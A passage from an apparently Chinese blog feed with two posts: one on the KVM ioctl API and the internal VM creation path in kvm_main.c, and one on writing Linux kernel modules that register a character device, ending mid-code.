API实际上就是一组<code>ioctl</code>指令集合，主要功能是为了控制虚拟机的整个生命周期。其所提供的用户空间API从功能上划分，大致可以分为三种类型</p><table><thead><tr><th>API类型</th><th>功能说明</th></tr></thead><tbody><tr><td>System指令</td><td>针对虚拟机全局性参数进行查询和设置以及用于虚拟机创建等操作控制</td></tr><tr><td>VM指令</td><td>影响具体VM虚拟机的属性进行查询和设置，比如内存大小设置、创建VCPU等。VM指令不是进程安全的</td></tr><tr><td>vCPU指令</td><td>针对具体vCPU进行参数设置，比如MRU寄存器读写、中断控制等</td></tr></tbody></table><p>这些API指令都是围绕<code>/dev/kvm</code>来进行的，他是一个标准的字符型设备</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/KVMlearning$ ls -l /dev/kvmcrw-rw----+ 1 root kvm 10, 232 Apr 30 07:02 /dev/kvm</code></pre><p>一般来说，用户态程序通过对KVM API的操作是由打开kvm设备文件开始的，通过调用open来获取该文件的一个句柄指针也就是文件描述符，然后通过ioctl系统调用加上特定的指令字来执行我们的操作。</p><h4 id="KVM-API中的结构体们"><a href="#KVM-API中的结构体们" class="headerlink" title="KVM API中的结构体们"></a>KVM API中的结构体们</h4><p>首先那就当然是我们的<code>file_operations</code>，他在<code>/linux/fs.h</code>当中定义，用来存储驱动内核模块提供的对设备进行各种操作的函数指针。该结构体的每个域都对应着驱动内核模块用来处理某个被请求事务的函数地址，他定义在<code>/include/linux/fs.h</code>当中：</p><pre><code class="hljs">struct file_operations &#123;    struct module *owner;    loff_t (*llseek) (struct file *, loff_t, int);    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);    ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);    ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);    int (*iopoll)(struct kiocb *kiocb, bool spin);    int (*iterate) (struct file *, struct dir_context *);    int (*iterate_shared) (struct file *, struct dir_context *);    __poll_t (*poll) (struct file *, struct poll_table_struct *);    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);    long (*compat_ioctl) (struct file *, unsigned int, unsigned long);    int (*mmap) (struct file *, struct vm_area_struct *);    unsigned long mmap_supported_flags;    int (*open) (struct inode *, struct file *);    int (*flush) (struct file *, fl_owner_t id);    int (*release) (struct inode *, struct file *);    int (*fsync) (struct file *, loff_t, loff_t, int datasync);    int (*fasync) (int, struct file *, int);    int (*lock) (struct file *, int, struct file_lock *);    ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);    unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);    int (*check_flags)(int);    int (*flock) (struct file *, int, struct file_lock *);    ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);    ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);    int (*setlease)(struct file *, long, struct file_lock **, void **);    long (*fallocate)(struct file *file, int mode, loff_t offset,              loff_t len);    void (*show_fdinfo)(struct seq_file *m, struct file *f);#ifndef CONFIG_MMU    unsigned (*mmap_capabilities)(struct file *);#endif    ssize_t (*copy_file_range)(struct file *, loff_t, struct file *,            loff_t, size_t, unsigned int);    loff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,                   struct file *file_out, loff_t pos_out,                   loff_t len, unsigned int remap_flags);    int (*fadvise)(struct file *, loff_t, loff_t, int);&#125; __randomize_layout;</code></pre><p>我们可以通过源码看出来他的一些成员就是咱们的系统调用的一些指针。<br>而KVM提供的接口当中，总的接口是<code>/dev/kvm</code>设备文件，该接口提供了KVM最基本的功能，如查询API版本、创建虚拟机等，对应的设备文件fop结构为<code>kvm_device_fops</code>,他定义在<code>/virt/kvm/kvm_main.c</code>当中：</p><pre><code class="hljs">static const struct file_operations kvm_device_fops = &#123;    .unlocked_ioctl = kvm_device_ioctl,    .release = kvm_device_release,    KVM_COMPAT(kvm_device_ioctl),    .mmap = kvm_device_mmap,&#125;;</code></pre><p>他是一个标准的<code>file_operations</code>结构体，但是中包含了ioctl函数，其他诸如<code>read</code>、<code>open</code>等常用系统调用均默认实现。所以我们就只能在用户态通过ioctl函数进行操作。</p><p>在KVM创建虚拟机的过程当中，我们首先通过上述接口创建一个VM，调用函数<code>kvm_dev_ioctl_creat_vm</code>,它实现在<code>/virt/kvm/kvm_main.c</code>当中，代码如下：</p><pre><code class="hljs">static int kvm_dev_ioctl_create_vm(unsigned long type)&#123;    int r;    struct kvm *kvm;    struct file *file;    kvm = kvm_create_vm(type);      //核心函数：真正创建vm函数，通过该函数创建一个匿名inode    if (IS_ERR(kvm))        return PTR_ERR(kvm);#ifdef CONFIG_KVM_MMIO    r = kvm_coalesced_mmio_init(kvm);    if (r &lt; 0)        goto put_kvm;#endif    r = get_unused_fd_flags(O_CLOEXEC);    if (r &lt; 0)        goto put_kvm;    snprintf(kvm-&gt;stats_id, sizeof(kvm-&gt;stats_id),            &quot;kvm-%d&quot;, task_pid_nr(current));    file = anon_inode_getfile(&quot;kvm-vm&quot;, &amp;kvm_vm_fops, kvm, O_RDWR);    if (IS_ERR(file)) &#123;        put_unused_fd(r);        r = PTR_ERR(file);        goto put_kvm;    &#125;    /*     * Don&#39;t call kvm_put_kvm anymore at this point; file-&gt;f_op is     * already set, with -&gt;release() being kvm_vm_release().  In error     * cases it will be called by the final fput(file) and will take     * care of doing kvm_put_kvm(kvm).     */    if (kvm_create_vm_debugfs(kvm, r) &lt; 0) &#123;        put_unused_fd(r);        fput(file);        return -ENOMEM;    &#125;    kvm_uevent_notify_change(KVM_EVENT_CREATE_VM, kvm);    fd_install(r, file);    return r;put_kvm:    kvm_put_kvm(kvm);    return r;&#125;</code></pre><p>在该函数当中调用了<code>kvm_create_vm</code>之后，创建一个匿名inode，对应fop为<code>kvm_vm_fops</code>的结构体。在QEMU当中则是通过ioctl调用&#x2F;dev&#x2F;kvm的接口，返回该inode的文件描述符，之后对该VM的操作全部都是通过该文件描述符进行，对应的fop结构定义在<code>/virt/kvm/kvm_main.c</code>当中，代码如下：</p><pre><code class="hljs">static struct file_operations kvm_vm_fops = &#123;    .release        = kvm_vm_release,    .unlocked_ioctl = kvm_vm_ioctl,    .llseek= noop_llseek,    KVM_COMPAT(kvm_vm_compat_ioctl),&#125;;</code></pre><p>创建完VM，QEMU还需要对每个虚拟机的vCPU创建一个线程，在其中调用<code>kvm_vm_ioctl</code>中的<code>KVM_CREATE_VCPU</code>，该操作通过<code>kvm_vm_ioctl</code>&#x3D;&gt;<code>kvm_vm_ioctl_create_vcpu</code>&#x3D;&gt;<code>create_vcpu_fd</code>创建一个名为<code>kvm-vcpu</code>的匿名inode并返回其描述符。之后对每个vCPU的操作都通过该文件描述符进行，该匿名inode的fop定义在<code>/virt/kvm/kvm_main.c</code>当中，如下：</p><pre><code class="hljs">static struct file_operations kvm_vcpu_fops = &#123;    .release        = kvm_vcpu_release,    .unlocked_ioctl = kvm_vcpu_ioctl,    .mmap           = kvm_vcpu_mmap,    .llseek= noop_llseek,    KVM_COMPAT(kvm_vcpu_compat_ioctl),&#125;;</code></pre><h4 id="System-ioctl调用"><a href="#System-ioctl调用" class="headerlink" title="System ioctl调用"></a>System ioctl调用</h4><p>这里给出我们system ioctl的一些指令字</p><ul><li><code>KVM_CREATE_VM</code>:创建KVM虚拟机，较为重要，通过该参数KVM将返回虚拟机对应的一个文件描述符，它指向内核空间中的一个新的虚拟机。全新的虚拟机没有vCPU,也没有内存，这需要通过后续的ioctl进行配置，使用mmap()系统调用，则会直接返回虚拟机对应的虚拟内存空间，并且内存偏移量为0.</li><li><code>KVM_GET_API_VERSION</code>:查询当前KVM API 版本</li><li><code>KVM_GET_MSR_INDEX_LIST</code>:获得MSR索引表</li><li><code>KVM_CHECK_EXTENSION</code>:检查扩展支持情况</li><li><code>KVM_GET_VCPU_MMAP_SIZE</code>:运行虚拟机以及获得用户态空间共享的一片内存区域大小，返回vCPU mmap区域的大小</li><li><code>KVM_RUN</code>:ioctl通过共享的内存区域与用户空间进行通信</li></ul><h4 id="VM-ioctl调用"><a href="#VM-ioctl调用" class="headerlink" title="VM ioctl调用"></a>VM ioctl调用</h4><p>我们这里的ioctl大多需要通过之前<code>kvm_create_vm</code>函数返回的fd来进行操作，其中具体包括：配置内存，配置vCPU，运行虚拟机等，主要ioctl指令如下：</p><ul><li><code>KVM_CREATE_VCPU</code>:为虚拟机创建vCPU,返回一个vCPU对应的fd描述符，然后后续调用下面的<code>KVM_RUN</code>来启动</li><li><code>KVM_RUN</code>:运行VM虚拟机，通过mmap()系统调用函数映射vCPU的fd所在的内存空间来获得kvm_run结构体，该结构体位于内存偏移量0中，结束位置在<code>KVM_GET_VCPU_MMAP_SIZE</code></li><li><code>KVM_CREATE_IRQCHIP</code>:创建虚拟APIC，这里APIC应该是可编程中断控制器，然后将之后创建的vCPU关联到此APIC</li><li><code>KVM_IRQ_LINE</code>:对某虚拟APIC发送中断信号</li><li><code>KVM_GET_IRQCHIP</code>:读取APIC的中断标志信息</li><li><code>KVM_SET_IRQCHIP</code>:写入APIC的中断标志信息</li><li><code>KVM_GET_DIRTY_LOG</code>: 返回脏内存页的位图</li></ul><p>其中<code>kvm_run</code>结构体位于<code>/include/upai/linux/kvm.h</code>当中，其中数据结构过长，因此用一下形式来表示他的字段</p><table><thead><tr><th>字段名</th><th>功能</th></tr></thead><tbody><tr><td>request_interrupt_window</td><td>向vCPU当中发出一个中断插入请求，让vCPU做好相关的准备工作</td></tr><tr><td>ready_for_interrupt_injection</td><td>响应上面的中断请求，当此位有效，说明可以进行中断</td></tr><tr><td>if_flag</td><td>中断标识，如果使用了APIC，则不起作用</td></tr><tr><td>hardware_exit_reason</td><td>当vCPU因各种不明原因退出的时候，该字段保存了失败的描述信息</td></tr><tr><td>io</td><td>为一个结构体，当KVM产生硬件出错的原因是因为I&#x2F;O输出时，该结构体将保存出错的I&#x2F;O请求的数据</td></tr><tr><td>mmio</td><td>为一个结构体，当KVM产生出错的原因时时因为内存I&#x2F;O映射，该结构体将保存出错的内存I&#x2F;O映射请求的数据</td></tr></tbody></table><h4 id="vCPU-ioctl调用"><a href="#vCPU-ioctl调用" class="headerlink" title="vCPU ioctl调用"></a>vCPU ioctl调用</h4><p>主要针对具体的每一个虚拟机的vCPU进行配置，包括寄存器读写，中断设置，内存设置，开关调试，时钟管理等功能，其中ioctl寄存器控制是最重要的环节，如下：</p><table><thead><tr><th>指令字</th><th>功能</th></tr></thead><tbody><tr><td>KVM_GET_REGS</td><td>获取通用寄存器信息，返回kvm_regs</td></tr><tr><td>KVM_SET_REGS</td><td>设置通用寄存器信息</td></tr><tr><td>KVM_GET_SREGS</td><td>获取特殊寄存器信息,返回kvm_sregs</td></tr><tr><td>KVM_SET_SREGS</td><td>设置特殊寄存器信息</td></tr><tr><td>KVM_GET_MSRS</td><td>获取MSR寄存器信息,返回kvm_msrs</td></tr><tr><td>KVM_SET_MSRS</td><td>设置MSR寄存器信息</td></tr><tr><td>KVM_GET_FPU</td><td>获取浮点寄存器信息,返回kvm_fpu</td></tr><tr><td>KVM_SET_FPU</td><td>设置浮点寄存器信息</td></tr><tr><td>KVM_GET_XSAVE</td><td>获取vCPU的xsave寄存器信息,返回kvm_xsave</td></tr><tr><td>KVM_SET_XSAVE</td><td>设置vCPU的xsave寄存器信息</td></tr><tr><td>KVM_GET_XCRS</td><td>获取vCPU的xcr寄存器信息,返回kvm_xcrs</td></tr><tr><td>KVM_SET_XCRS</td><td>设置vCPU的xcr寄存器信息</td></tr></tbody></table><h3 id="4-kvm内核模块数据结构"><a href="#4-kvm内核模块数据结构" class="headerlink" title="4.kvm内核模块数据结构"></a>4.kvm内核模块数据结构</h3><p>在我们创建的虚拟机时，我们一般是通过<code>/dev/kvm</code>字符设备的System ioctl来创建虚拟机VM，其中kvm结构体是关键，一个虚拟机对应一个kvm结构体，虚拟机的创建过程实际上就是kvm结构体的创建和初始化过程，大致如下：</p><pre><code class="hljs">用户态iotcl(fd, KVM_CREATE_VM,...)---&gt;内核态kvm_dev_ioctl()    kvm_dev_ioctl_creat_vm()        kvm_create_vm()//首先虚拟机创建的主要函数            kvm_arch_alloc_vm()//为kvm结构体分配空间            kvm_arch_init_vm()//初始化kvm结构中的架构相关部分，比如中断等            hardware_enable_all()//开启硬件、架构的相关操作                hardware_enable_nolock()                    kvm_arch_hardware_enable()                        kvm_x86_ops-&gt;hardware_enable()            kzalloc()//分配memslots结构，并初始化为0            kvm_init_memslots_id()//初始化内存槽位slot的id信息            kvm_eventfd_init()//初始化时间通道            kvm_init_mmu_notifier()//初始化mmu操作的通知链            list_add(&amp;kvm-&gt;vm_list, &amp;vm_list)//将新创建的虚拟机的kvm结构加入到全局链表vm_list当中</code></pre>]]></content>
    
    
    <categories>
      
      <category>Virtual Machine</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source</tag>
      
      <tag>vm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux_Kernel_0x01_LKMmaker</title>
    <link href="/2023/06/20/Linux-Kernel-0x01-LKMmaker/"/>
    <url>/2023/06/20/Linux-Kernel-0x01-LKMmaker/</url>
    
    <content type="html"><![CDATA[<h1 id="内核驱动简单认识"><a href="#内核驱动简单认识" class="headerlink" title="内核驱动简单认识"></a>内核驱动简单认识</h1><h2 id="自行编写驱动"><a href="#自行编写驱动" class="headerlink" title="自行编写驱动"></a>自行编写驱动</h2><p>首先咱们来介绍以下基础知识</p><h3 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h3><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p><ul><li>驱动程序（Device drivers）</li><li>设备驱动</li><li>文件系统驱动<br>…<br>内核扩展模块 (modules)<br>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe&#x2F;dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</li></ul><p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><hr><p>而Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。（而一般内核pwn中的漏洞出自这些模块里面，但是有的师傅也说内核也会有漏洞，这咱们以后再学）<br>这里比较常用的指令有以下几个：</p><ul><li>insmod: 讲指定模块加载到内核中</li><li>rmmod: 从内核中卸载指定模块</li><li>lsmod: 列出已经加载的模块</li><li>modprobe: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li><li>dmesg:输出内核态缓冲区的输出，这里跟用户态不一样，用户态一般输出到屏幕就完事了，内核中是输出到缓冲区。</li></ul><p>这里注意指令均需运行在管理员权限下。</p><hr><p>这里还注意一个特殊的函数ioctl</p><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><p>直接查看 man 手册</p><pre><code class="hljs">NAME       ioctl - control deviceSYNOPSIS       #include &lt;sys/ioctl.h&gt;       int ioctl(int fd, unsigned long request, ...);DESCRIPTION       The ioctl() system call manipulates the underlying device parameters of special       files.  In particular, many  operating  characteristics  of  character  special       files  (e.g., terminals) may be controlled with ioctl() requests.  The argument       fd must be an open file descriptor.       The second argument is a device-dependent request code.  The third argument  is       an  untyped  pointer  to  memory.  It&#39;s traditionally char *argp (from the days       before void * was valid C), and will be so named for this discussion.       An ioctl() request has encoded in it whether the argument is an in parameter or       out  parameter, and the size of the argument argp in bytes.  Macros and defines       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.</code></pre><p>可以看出 ioctl 也是一个系统调用，用于与设备通信。<br>int ioctl(int fd, unsigned long request, …) 的第一个参数为打开设备 (open) 返回的 文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p><p>使用 ioctl 进行通信的原因：</p><blockquote></blockquote><p>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。<br>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。<br>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p><h3 id="1-初级LKM模块"><a href="#1-初级LKM模块" class="headerlink" title="1.初级LKM模块"></a>1.初级LKM模块</h3><pre><code class="hljs">#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;static int __init kernel_module_init(void)&#123;    printk(&quot;&lt;1&gt;Hello the Linux kernel world!\n&quot;);    return 0;&#125;static void __exit kernel_module_exit(void)&#123;    printk(&quot;&lt;1&gt;Good bye the Linux kernel world! See you again!\n&quot;);&#125;module_init(kernel_module_init);module_exit(kernel_module_exit);MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;peiwithhao&quot;);</code></pre><p>当编写完成后咱们用make脚本进行编译链接，脚本如下</p><pre><code class="hljs">obj-m += peiwithhaoCURRENT_PATH := $(shell pwd)LINUX_KERNEL := $(shell uname -r)LINUX_KERNEL_PATH := /usr/src/linux-headers-$(LINUX_KERNEL)all:        make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modulesclean:        make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean</code></pre><p>这里程序有几个注意点在以下标识</p><h4 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h4><ul><li>linux&#x2F;module.h：对于LKM而言这是必须包含的一个头文件</li><li>linux&#x2F;kernel.h：载入内核相关信息</li><li>linux&#x2F;init.h：包含着一些有用的宏</li></ul><p>通常情况下，这三个头文件对于内核模块编程都是不可或缺的</p><h4 id="入口点-x2F-出口点"><a href="#入口点-x2F-出口点" class="headerlink" title="入口点&#x2F;出口点"></a>入口点&#x2F;出口点</h4><p>一个内核模块的入口点应当为 module_init()，出口函数应当为module_exit()，在内核载入&#x2F;卸载内核模块时会缺省调用这两个函数</p><p>在这里我们将自定义的两个函数的指针作为参数传入LKM入口函数&#x2F;出口函数中，以作为其入口&#x2F;出口函数</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p> __init &amp; __exit：这两个宏用以在函数结束后释放相应的内存<br>MODULE_AUTHOR() &amp; MODULE_LICENSE()：声明内核作者与发行所用许可证<br>printk()：内核态函数，用以在内核缓冲区写入信息，其中&lt;1&gt;标识着信息的紧急级别（一共有8个优先级，0为最高，相关宏定义于linux&#x2F;kernel.h中，这个大伙可以查查资料，在后面我一般用printk(KERN_INFO””),这个跟&lt;6&gt;好像时一个意思）</p><p>由于make我也才刚接触，所以这里不做解释免得误导大家。<br>这里继续<code>make</code>即可，然后咱们使用如下命令</p><pre><code class="hljs">insmod hellokernel.kolsmodrmmod hellokerneldmesg</code></pre><p>这里由于我之前这个模块过于简单就忘保存了，所以引用一下师傅的图<br><img src="https://i.loli.net/2021/02/28/vJitGgkFTzcPx8a.png"></p><h3 id="2-提供IO接口"><a href="#2-提供IO接口" class="headerlink" title="2.提供IO接口"></a>2.提供IO接口</h3><p>虽然说我们的新模块成功跑起来了，但是除了在内核缓冲区进行输入输出以外好像就做不了什么了，我们希望我们写的内核模块能够向我们提供更多的功能并能够让用户与其进行交互，以发挥更多的作用<br>所以这里我们的首要步骤就是注册设备。而为了与设备进行交互，我们就需要驱动来为咱们隐藏底层做的很多事，就好比我想用打印机，但要是咱们编程的时候既要考虑到用户这边，又要考虑到设备这边的问题，咱们就太累了，幸好在计算机中没有什么是加一层解决不了的，如果不行，那就加两层。<br>所以出现了驱动的这一概念，驱动也就帮咱们隐藏了底层实现，咱们调用的时候只需要会open，read，write即可。</p><h4 id="设备分类"><a href="#设备分类" class="headerlink" title="设备分类"></a>设备分类</h4><p>在Linux中I&#x2F;O设备分为如下两类：</p><ul><li>字符设备：在I&#x2F;O传输过程中以字符为单位进行传输的设备，例如键盘、串口等。字符设备按照字符流的方式被有序访问，不能够进行随机读取</li><li>块设备：在块设备中，信息被存储在固定大小的块中，每个块有着自己的地址，例如硬盘、SD卡等。用户可以对块设备进行随机访问——从任意位置读取一定长度的数据</li></ul><h4 id="file-operations结构体"><a href="#file-operations结构体" class="headerlink" title="file_operations结构体"></a>file_operations结构体</h4><p>在注册设备之前，我们需要用到一个结构体——file_operations来完成对设备的一些相关定义，该结构体定义于include&#x2F;linux&#x2F;fs.h中，相关源码比较长不在此贴出，在其中定义了大量的函数指针,这里再之后的代码会体现出来，他也就是定义了open、read等系统调用的函数指针。</p><p>一个文件应当拥有一个file_operations实例，并指定相关系统调用函数指针所指向的自定义函数，在后续进行设备的注册时会使用该结构体</p><h4 id="主设备号-amp-次设备号"><a href="#主设备号-amp-次设备号" class="headerlink" title="主设备号 &amp; 次设备号"></a>主设备号 &amp; 次设备号</h4><p>在Linux内核中，使用类型dev_t（unsigned long）来标识一个设备的设备号。<br>一个字符的设备号由主设备号与次设备号组成，高字节存储主设备号，低字节存储次设备号：<br>主设备号：标识设备类型，使用宏MAJOR(dev_t dev)可以获取主设备号<br>次设备号：用以区分同类型设备，使用宏MINOR(dev_t dev)可以获取次设备号<br>Linux还提供了一个宏 MKDEV(int major, int minor);，用以通过主次设备号生成对应的设备号</p><h4 id="设备节点（struct-device-node-amp-struct-device）"><a href="#设备节点（struct-device-node-amp-struct-device）" class="headerlink" title="设备节点（struct device_node &amp; struct device）"></a>设备节点（struct device_node &amp; struct device）</h4><p>由于Linux中所有的设备都以文件的形式进行访问，这些文件存放在&#x2F;dev目录下，一个文件就是一个设备节点，如下图<br><img src="http://imgsrc.baidu.com/forum/pic/item/dcc451da81cb39dbc797769495160924aa183098.jpg"></p><p>在Linux kernel中使用结构体device描述一个设备，该结构体定义于include&#x2F;linux&#x2F;device.h（内核源码路径）中，每个设备在内核中都有着其对应的device实例，其中记录着设备的相关信息</p><p>在DTS（Device Tree Source，设备树）中则使用device_node结构体表示一个设备</p><h4 id="设备类（struct-class）"><a href="#设备类（struct-class）" class="headerlink" title="设备类（struct class）"></a>设备类（struct class）</h4><p>在Linux kernel中使用结构体class用以表示高层次抽象的设备，该结构体定义于include&#x2F;linux&#x2F;device&#x2F;class.h中</p><p>每个设备节点实例中都应当包含着一个指向相应设备类实例的指针</p><p>设备的注册与注销<br>方便起见，我们接下来将会注册一个字符型设备，大致的一个步骤如下：</p><p>使用由内核提供的函数<code>register_chrdev(unsigned int major, const char *name, const struct file_operations *fops)</code>进行字符型设备注册，该函数定义于include&#x2F;linux&#x2F;fs.h，会将注册成功后的主设备号返回，若失败则会返回一个负值，参数说明如下：<br>major：主设备号，若为0则由内核分配主设备号<br>name：设备名，由用户指定<br>fops：该设备的文件操作系统（file_operations结构体）指针<br>使用宏class_create(owner, name)创建设备类，该宏定义于include&#x2F;linux&#x2F;device.h中，其核心调用函数是__class_create(struct module *owner, const char *name, struct lock_class_key *key)</p><p>使用函数<code>device_create(struct class *cls, struct device *parent, dev_t devt, void *drvdata, const char *fmt, ...)</code>创建设备节点，若成功则最终会在&#x2F;dev目录下生成我们的设备节点文件，各参数说明如下：</p><p>cls：该设备的设备类<br>parent：该设备的父设备节点，通常情况下应当为某种总线或主机控制器，若该设备为顶级设备则设为NULL<br>devt：该设备的设备号<br>drvdata：该驱动的相关信息，若无则填NULL<br>fmt：设备名称<br>设备的注销则是逆着上面的进程进行，同样有着相对应的三个函数：<code>device_destroy(struct class *cls, dev_t devt)</code>、<code>class_destroy(struct class *cls)</code>、<code>unregister_chrdev(unsigned int major, const char *name)</code>，用法相似，这里就不一一赘叙了</p><p>✳ 需要注意的是若是注册设备的进程中的某一步出错了，我们在退出内核态函数之前应当手动调用注销函数清理原先的相关资源</p><h4 id="设备权限"><a href="#设备权限" class="headerlink" title="设备权限"></a>设备权限</h4><p>内核模块运行在内核空间，所创建的设备节点只有root用户才有权限进行读写，对于其他用户而言便毫无意义，这并不是我们想要的，因此我们需要通过进一步的设置使得所有用户都有权限通过设备节点文件与我们的内核模块进行交互</p><p>在内核中使用inode结构体表示一个文件，该结构体定义于include&#x2F;linux&#x2F;fs.h中，其中用以标识权限的是成员i_mode</p><p>而在内核中对于使用flip_open()打开的文件，Linux内核中使用 file 结构体进行描述，该结构体定义于include&#x2F;linux&#x2F;fs.h中，其中有着指向内核中该文件的 inode 实例的指针，使用file_inode()函数可以获得一个 file 结构体中的 inode 结构体指针</p><p>那么我们不难想到，若是在内核模块中使用file_open()函数打开我们的设备节点文件，随后修改 file 结构体中的 inode 指针指向的 inode 实例的 i_mode 成员，便能够修改该文件的权限,</p><p>大伙可以照着敲一敲，逻辑很简单。</p><pre><code class="hljs">#include&lt;linux/module.h&gt;                //it have to exist#include&lt;linux/kernel.h&gt;                //loading the information of kernel#include&lt;linux/init.h&gt;                        //contain some useful define#include&lt;linux/fs.h&gt;                        #include&lt;linux/device.h&gt;#define DEVICE_NAME &quot;peiwithhao&quot;#define DEVICE_PATH &quot;/dev/peiwithhao&quot;#define CLASS_NAME &quot;P_Wmodule&quot;static int major_num;static struct class * module_class = NULL;static struct device * module_device = NULL;static struct file * __file = NULL;struct inode * __inode = NULL;static struct file_operations PW_module_fo = &#123;                                                        //descripe the device        .owner = THIS_MODULE&#125;;static int __init kernel_module_init(void)&#123;        printk(KERN_INFO &quot;[peiwithhao_TestModule:]Module loaded. Start to register device ...\n&quot;);        major_num = register_chrdev(0,DEVICE_NAME,&amp;PW_module_fo);                        //register the major number        if(major_num &lt;0)&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to register a major number! \n&quot;);                return major_num;        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Register completed ,major number: %d\n&quot;,major_num);                module_class = class_create(THIS_MODULE,CLASS_NAME);                                //create the struct class        if(IS_ERR(module_class))&#123;                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to register class device!\n&quot;);                return PTR_ERR(module_class);        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Class Register complete. \n&quot;);        module_device = device_create(module_class,NULL,MKDEV(major_num,0),NULL,DEVICE_NAME);        //create the device        if(IS_ERR(module_class))&#123;                class_destroy(module_class);                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to create the device! \n&quot;);                return PTR_ERR(module_class);        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module Register complete. \n&quot;);        __file = filp_open(DEVICE_PATH, O_RDONLY,0);                                                //open the file ,now that device        if(IS_ERR(__file))&#123;                device_destroy(module_class,MKDEV(major_num,0));                class_destroy(module_class);                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Unable to change module privilege! \n&quot;);                return PTR_ERR(__file);        &#125;        __inode = file_inode(__file);                __inode-&gt;i_mode |= 0666;                                        filp_close(__file,NULL);        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module privilege change complete.... \n&quot;);        return 0;&#125;static void __exit kernel_module_exit(void)&#123;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Start to clean up the module... \n&quot;);        device_destroy(module_class,MKDEV(major_num,0));        class_destroy(module_class);        unregister_chrdev(major_num,DEVICE_NAME);        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module clean up complete. See you next time! \n&quot;);&#125;module_init(kernel_module_init);                //inmodule_exit(kernel_module_exit);                //outMODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;dawn&quot;);</code></pre><p>之后就是编译make，然后测试，在这里咱们注册了一个device，所以咱们也可以到&#x2F;dev目录底下查看<br>dmesg查看效果<br><img src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b5054bcf190c035e5dde6116eb4.jpg"></p><blockquote><p>这里注意下，为什么都要先lsmod 再rmmod呢，因为咱们在注册的时候会调用init那个函数，卸载时会调用exit，由于需要都看看进程所以一起用来算了</p></blockquote><h4 id="3-编写系统调用接口"><a href="#3-编写系统调用接口" class="headerlink" title="3.编写系统调用接口"></a>3.编写系统调用接口</h4><p>我们编写如下的三个简单的函数使得用户应用程式可以通过open、close、read、write、ioctl与其进行交互</p><p>在这里我们引入了自旋锁spinlock_t类型变量以增加对多线程的支持</p><p>需要注意的是file_operations结构体中ioctl的函数指针应当为unlocked_ioctl，close对应的函数指针应当为release</p><p> 还有就是内核空间与用户空间之间传递数据应当使用copy_from_user(void *to, const void *from, unsigned long n)、copy_to_user(void *to, const void *from, unsigned long n)函数，从函数名咱们就可以知道他的妙用。</p><p>代码如下，我稍作解释，对了这里分出了头文件，因为文件太长了，我一切跟着师傅走然后慢慢理解<br>首先是p_wmodule.h</p><pre><code class="hljs">#include&lt;linux/module.h&gt;                //it have to exist#include&lt;linux/kernel.h&gt;                //loading the information of kernel#include&lt;linux/init.h&gt;                        //contain some useful define#include&lt;linux/fs.h&gt;                        #include&lt;linux/device.h&gt;#define 